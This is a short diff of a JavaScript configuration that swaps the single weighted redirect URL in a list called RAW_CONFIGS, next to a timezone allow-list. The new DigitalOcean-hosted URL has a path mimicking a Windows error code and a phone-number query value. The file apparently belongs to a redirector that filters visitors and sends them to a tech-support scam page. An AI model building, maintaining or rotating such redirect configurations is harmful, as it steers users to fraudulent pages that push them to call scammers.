@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://sea-lion-app-xtz8x.ondigitalocean.app/Win0codejInfouycinfcode/index.html", weight: 1.0 }
+    { url: "https://seal-app-knkiq.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-866-881-4790", weight: 1.0 }
 
 ];
 
